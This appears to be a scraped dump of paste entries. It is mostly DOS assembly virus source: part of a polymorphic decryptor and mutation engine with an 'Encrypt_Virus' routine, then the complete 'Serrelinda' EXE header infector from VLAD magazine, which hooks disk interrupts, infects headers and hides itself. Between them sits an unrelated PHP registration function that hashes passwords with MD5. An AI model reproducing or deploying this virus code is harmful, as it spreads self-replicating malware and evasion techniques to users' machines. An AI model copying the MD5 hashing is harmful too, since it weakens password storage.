        mov     word ptr saved_cx,ax
        ret

Fix_Displacements:
;Adds the size of the produced decyptors to the data listed in the
;displacement variables. 0 Values signal the end.
;DI=The final length of the 'decryptor'

        push    ax
        push    si
        
        mov     ax,di
        sub     ax,word ptr saved_di
        push    di
        mov     si,offset displace
disp_loop:
        cmp     word ptr [si],0
        je      last_displacement
        mov     di,[si]
        add     [di],ax
        inc     si
        inc     si
        jmp     short disp_loop
last_displacement:
        pop     di
        pop     si
        pop     ax
        ret

Rand_Garbage:
;Generates 1-4 garbage instructions.
        push    ax
        call    get_rand
        and     ax,07h
        push    cx
        mov     cx,ax
        inc     cx
start_garbage:
        call    select_garbage
        loop    start_garbage
        pop     cx
        pop     ax
        ret

Select_Garbage:
;Selects a garbage routine to goto
        
        call    get_rand
        and     ax,14
        push    si
        mov     si,offset calls
        add     si,ax
        mov     ax,word ptr [si]
        pop     si
        jmp     ax

calls   dw      offset Make_Inc_Dec
        dw      offset Imm2Reg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Make_Xchg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Imm2Reg

Make_Inc_Dec:
;Puts a word INC/DEC in ES:DI
;eg INC  AX
;   DEC  BP

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,15
        ja      not_poly_start          ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start:
        call    get_rand
        call    check_reg
        jc      make_inc_dec
        and     al,0fh
        or      al,40h
        
        test    al,8
        jnz     calc_dec

        stosb
        ret
calc_dec:
        mov     ah,al
        and     al,7
        cmp     al,2
        ja      Make_Inc_Dec
        mov     al,ah
        stosb
        ret

Fix_Register:
;AX=random byte, where the expected outcome is ah=opcode al=mod/rm
;Carry is set if bad register.  Word_Byte is updated to show word/byte.
        test    ah,1
        jnz     word_garbage
        mov     byte ptr word_byte,0
        call    check_breg
        jmp     short byte_garbage
word_garbage:
        mov     byte ptr word_byte,1
        call    check_reg
byte_garbage:
        ret        
word_byte       db      0       ;1=word, 0 = byte


Imm2Reg:
;Immediate to register.
        call    get_rand
        call    fix_register
        jc      imm2reg
        test    al,7            ;AX/AL arent allowed (causes heuristics)
        jz      imm2ax
        xchg    al,ah
        and     al,3
        cmp     al,2            ;signed byte is bad
        je      imm2reg
        or      al,80h
        or      ah,0c0h
        stosw
        test    al,2            ;signed word
        jnz     ione_stosb
        call    get_rand
        cmp     byte ptr word_byte,1
        jne     ione_stosb
        stosb
ione_stosb:
        call    get_rand
        stosb
        ret
imm2ax:
        xchg    ah,al
        and     al,3dh
        or      al,4
        stosw
        test    al,1
        jnz     ione_stosb
        ret

Rand_Instr:
;Creates a whole stack of instructions.
;and,or,xor,add,sub,adc,cmp,sbb

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start2         ;in the first 20 bytes, flags G
        ret
not_poly_start2:
        call    get_rand
        ;Inloop stops xxx xx,word ptr [xxxx] instructions inside the
        ;loops.  It changes them to 'byte ptr' which stops the ffff crash
        ;problem.
        cmp     byte ptr inloop,1
        jne     ok_words
        and     ah,0feh
ok_words:
        call    fix_register
        jc      rand_instr
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        xchg    ah,al
        and     al,039h
        or      al,2            ;set direction flag
        stosb
        mov     al,ah
        and     al,0c0h
        cmp     al,0c0h
        je      zerobytedisp
        cmp     al,0
        je      checkdisp
        cmp     al,80h
        je      twobytedisp
        ;sign extended
        mov     al,ah
        stosb
negative_value:
        call    get_rand
        cmp     al,0ffh
        je      negative_value
        stosb
        ret
twobytedisp:
        mov     al,ah
        stosb
        call    get_rand
        stosw
        ret
checkdisp:
        push    ax
        and     ah,7
        cmp     ah,6
        pop     ax
        je      twobytedisp
zerobytedisp:
        mov     al,ah
        stosb
        ret

Mov_Imm:
;Puts a MOV immediate instruction.
        call    get_rand
        test    al,8
        jnz     word_mov
        call    check_breg
        jmp     short mov_check
word_mov:
        call    check_reg
mov_check:
        jc      mov_imm
        and     al,0fh
        or      al,0b0h
        stosb
        test    al,8
        jnz     mov_word
        call    get_rand
        stosb
        ret
mov_word:
        call    get_rand
        stosw
        ret

Init_Rand:
;Initialises the Get_Rand procedure.
        push    ax
        push    cx
        push    dx
        push    si
        push    ds
        mov     si,1
        mov     ax,0ffffh               ;Get word from ROM BIOS.
        mov     ds,ax
        mov     ax,word ptr [si]
        pop     ds
        mov     word ptr randseed,ax
        call    get_rand
        push    ax
        mov     ah,2ah                  ;Get Date.
        int 21h ;call   int21h
        pop     ax
        add     ax,cx
        xor     ax,dx
        mov     word ptr randseed,ax
        call    get_rand
        pop     si
        pop     dx
        pop     cx
        pop     ax
        ret

Get_Rand:
;Gets a random number in AX.
        push    cx
        push    dx
        mov     ax,word ptr randseed
        mov     cx,ax
        mov     dx,ax
        and     cx,1ffh
        or      cl,01fh
propogate:
        add     dx,ax
        mul     dx
        add     ax,4321h
        neg     ax
        ror     dx,1
        loop    propogate
        mov     word ptr randseed,ax
        
        pop     dx
        pop     cx
        ret
randseed        dw      0

Make_Xchg:
        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start3         ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start3:

        call    get_rand
        call    fix_register
        jc      make_xchg
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        call    fix_register
        jc      make_xchg
        test    ah,1
        jz      xchg_8bit
        test    al,7
        jz      xchg_ax2
        test    al,38h
        jz      xchg_ax1
xchg_8bit:
        and     ax,13fh
        or      ax,86c0h
        xchg    ah,al
        stosw
        ret
xchg_ax1:
        and     al,7
        or      al,90h
        stosb
        ret
xchg_ax2:
        push    cx
        mov     cl,3
        ror     al,cl
        pop     cx
        jmp     short xchg_ax1

Check_bReg:
;Checks if an 8bit reg is used or not.
;AL=register
        push    ax
        and     al,3
        call    check_reg
        pop     ax
        ret

Decryptor_Size:
;Calculate the size of the decryptor + code
;Entry: DI=everything done
;Exit : CX=total decryptor length

        mov     cx,di
        sub     cx,word ptr saved_di
        ret

Setup_Cipher:
;Randomly selects a cipher register and initialises it with a value.
;Puts the register into the variable 'cipher' and the value into 'xorval'

        call    rand_garbage
        call    get_rand
        mov     bx,ax
        mov     word ptr xorval,ax
        call    select_reg
        mov     byte ptr cipher,al
        call    setup_reg
        call    rand_garbage
        ret

Startup:
;Does the most common startup procedures.  Puts some garbage, and sets
;up the pointer register.

        call    rand_garbage
        call    rand_garbage
        call    select_pointer          ;Setup pointer
        call    setup_pointer

        call    setup_cipher
        ret

Handle_JNE:
;Randomly puts either JNE or JB at ES:DI.
;Must be called after the CMP instruction.
        push    ax
        push    si

        ;Test to make sure our pointer isnt going +ffff, if so, only use
        ;jne, not jnb.
        call    round_up
        add     ax,word ptr pointer1val
        jnc     random_jne
        mov     al,75h
        jmp     short unrandom_jne
random_jne:

        call    get_rand
        and     ax,1
        mov     si,offset jne_table
        add     si,ax
        mov     al,byte ptr [si]
unrandom_jne:
        stosb
        pop     si
        pop     ax
        ret

jne_table       db      75h     ;JNE/JNZ
                db      72h     ;JB/JNAE

Calc_JNE:
;Calculates the distance needed to JMP backwards and puts it into ES:DI.
;On entry DI points to the byte after a JNE/JB instruction
;         and 'loopstart' contains the offset of the loop.

        push    ax
        mov     ax,di
        inc     ax
        sub     ax,word ptr loopstart
        neg     al
        stosb
        call    rand_garbage
        pop     ax
        ret

Increase_Pointer:
;Increases the register specified in 'pointer' by two.
;On exit AL=pointer register.

        call    rand_garbage
        xor     ax,ax
        mov     al,byte ptr pointer
        call    dec_inc_reg
        call    rand_garbage
        call    dec_inc_reg
        call    rand_garbage
        ret

Encrypt_Type:
;Selects the type of encryption and sets everything up.
        call    rand_garbage
        call    seg_override

        call    rand3
        mov     al,byte ptr [si+1]
        mov     byte ptr encbyte,al

        mov     al,byte ptr [si]        ;The instruction from 'enc_table'
        stosb

        mov     al,byte ptr cipher
        call    fix_pointer
        mov     word ptr displace,di
        
        mov     ax,bp
        sub     ax,word ptr pointval
        stosw

        call    rand_garbage
        
        call    rand3
        mov     al,byte ptr [si+2]
        or      al,0c3h
        mov     byte ptr encb2,al
        
        cmp     byte ptr cipher,0
        jne     fix_16imm
        mov     al,byte ptr [si+2]
        or      al,5
        stosb
        jmp     short set_imm

fix_16imm:
        mov     al,81h
        stosb
        mov     al,byte ptr [si+2]
        or      al,0c0h
        or      al,byte ptr cipher
        stosb

set_imm:
        call    get_rand
        stosw

        mov     word ptr encval2,ax

        call    increase_pointer

        ret

enc_table       db      31h     ;XOR            ;Direct word operation
                db      33h     ;XOR reg,reg    ;Undo..
                db      30h

                db      01h     ;ADD
                db      2bh     ;SUB reg,reg
                db      0       ;ADD

                db      29h     ;SUB
                db      03h     ;ADD reg,reg
                db      28h

Rand3:
;Gets a number in ax, either 0,4,8, and indexes SI that distance into
;enc_table.
encrypt_rand:
        call    get_rand
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     ax,dx
        xor     dx,dx
        mul     cx
        mov     si,offset enc_table
        add     si,ax
        ret

Encrypt_Virus:
        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_loop:
        lodsw

        ;op ax,bx
        encbyte db      0       ;op
                db      0c3h

                db      81h
        encb2   db      0
        encval2 dw      0

        stosw
        loop    enc_loop
        ret
"
2AdtbMEu,Untitled,azkya,MySQL,Sunday 19th of November 2023 06:21:26 AM CDT," public function regristation()
    {
        $user = $this->Users->newEmptyEntity();
        if ($this->request->is('post')) {
            $param = $this->request->getData();
            $user = $this->Users->patchEntity($user, $this->request->getData());
            $user->uid = Text::uuid();
            $user->password = md5($param['password']);
            if ($this->Users->save($user)) {
                $this->Flash->success(__(""Regristation Success.""));

                return $this->redirect(['action' => 'regristation']);
            }
            $this->Flash->error(__('Not able to regristation'));
        }
        $this->set(compact('user'));
    }"
CaczQreX,VLAD Magazine - Issue #6 - ARTICLE.5_3 - Serrelinda - EXE Header Infector,FlyFar,ASM (NASM),Sunday 19th of November 2023 06:13:13 AM CDT,"; Serrelinda, an EXE header infector by Rhincewind [Vlad]
;
; This is a fullstealth header infector with a twist: it goes resident
; underneath the hosting program, does not convert hosts to COM structure
; and is capable of restoring the host in memory (no reexecution).
; In short, it's the old principle all over again in a new implementation.
;
; Viruscode is inserted into the zerospace in suitable EXE headers, suitable
; meaning: no relocation items and a headersize of 512 bytes. The trick is
; to set the headersize to 32 bytes, and just zero CS:IP. This will cause
; the viruscode to be loaded below the host's code, giving the following
; memory order: MCB PSP VIRUS HOST. The virus switches context before copying
; itself over the PSP. The original MCB is adjusted to reflect the virussize
; and interpreter-ownership, and a 2nd MCB is created above the viruscode. 
; Finally, a new PSP is created, and we have: MCB VIRUS MCB PSP HOST which
; is in a word, great. The only drawback is the memory fragmentation
; caused by the environment block no longer being attached to it's owning
; PSP. (non-consecutive MCBs with same ID field).
;
; Header infection is done on sector reads. A suitable header is read,
; infected, written back and then stealthed before it's returned.
; This is Serrelinda's safeguard. If ever you infect some files by accident, 
; just copy them and reboot. Voila, la disinfection.
;
; Oh FYI, TbClean bails on int 21, ah=55 or ah=26 (create PSP). 
; More on Frans' jumptables later.
;
; Rhince.

                .model tiny
                .code
                org 0
viruslen        equ (endvirus-start)
start:         
                xor di,di
                mov si,di
                mov bx, word ptr ds:[si+16h]
                mov ah, 50h
                int 21h
                mov cx, 00ffh
                push cx
                push word ptr ds:[si+2ch]
                push cs
                pop ds
                rep movsb
                mov virseg,es
                jmp $+2
                db 0eah
                dw offset low_entry
virseg          dw 0
low_entry:      mov cx, viruslen-0ffh
                rep movsb
                mov ax,cs
                dec ax
                mov ds,cx
                mov si,13h*4
                movsw
                movsw
                mov si,ds
                mov ds,ax
                mov di, 1d0h
                mov al, 'M'
                xchg al, byte ptr ds:[si]
                stosb
                scasw
                mov word ptr ds:[si+1],bx
                mov ax, 01dh
                xchg word ptr ds:[si+3],ax
                sub ax, word ptr ds:[si+3]
                stosw
                mov dx,es
                add dx,1eh
                mov ah, 55h
                int 21h
                mov word ptr es:[di-4],dx
                pop cx
                dec cx
                mov es,cx
                mov word ptr es:[1],dx
                push dx
                mov ax, offset int13+10h
                mov dx, 2513h
                xchg ax,dx
                int 21h
installed:      pop bx
                mov ds,bx
                mov es,bx
                add bx, 10h
                add word ptr cs:[jmp_cs],bx
                inc cx
                mov word ptr ds:[2ch], cx
                pop cx
                xor ax,ax
                mov bx,ax
                mov si,ax
                mov di,sp
                jmp $+2
                db 0eah
jmp_ip          dw 0
jmp_cs          dw -10h
int13:                
                cmp ah,2
                jz do_it
go_go_int13:
                jmp go_int13
do_it:
                pushf
                call dword ptr cs:int13offset+10h
                push ax
                pushf
                jc go_wrong_file
                mov ax, word ptr es:[bx]
                xor al,ah
                cmp al, 4dh xor 5ah
                jz exe_file
go_wrong_file:  jmp wrong_file_bubba
                db '[Serrelinda], Rhince/VLAD'
exe_file:
                xor ax,ax
                cmp word ptr es:[bx+6],ax
                jnz go_wrong_file
                cmp word ptr es:[bx+1ah],ax
                jnz go_wrong_file
                cmp word ptr es:[bx+20h],0FF33h
                jz mr_stealth
                cmp word ptr es:[bx+8],20h
                jnz go_wrong_file
infect:
                add word ptr es:[bx+0eh],20h
                mov ax, word ptr es:[bx+14h]
                mov word ptr cs:[jmp_ip+10h],ax
                mov ax, word ptr es:[bx+16h]
                mov word ptr cs:[jmp_cs+10h],ax
                mov word ptr es:[bx+8],2
                push cx
                push si
                push di
                push ds
                push cs
                pop ds
                mov si, 10h
                lea di, [bx+20h]
                mov cx, (endvirus-start)
                cld
                rep movsb
                mov word ptr es:[bx+14h], cx
                mov word ptr es:[bx+16h], cx
                xchg ax,cx
                pop ds
                pop di
                pop si
                pop cx
                add ax, 0301h
                int 13h
mr_stealth:
                sub word ptr es:[bx+0eh],20h
                mov ax, word ptr es:[bx+jmp_ip+20h]
                mov word ptr es:[bx+14h],ax
                mov ax, word ptr es:[bx+jmp_cs+20h]
                mov word ptr es:[bx+16h],ax
                mov word ptr es:[bx+8],20h
                push cx
                push di
                cld
                mov cx, (endvirus-start)
                lea di, [bx+20h]
                xor al,al
                rep stosb
                pop di
                pop cx
wrong_file_bubba:
                popf
                pop ax
                retf 2
go_int13:
                db 0eah
endvirus:
int13offset     dw 0
int13seg        dw 0
                end start"
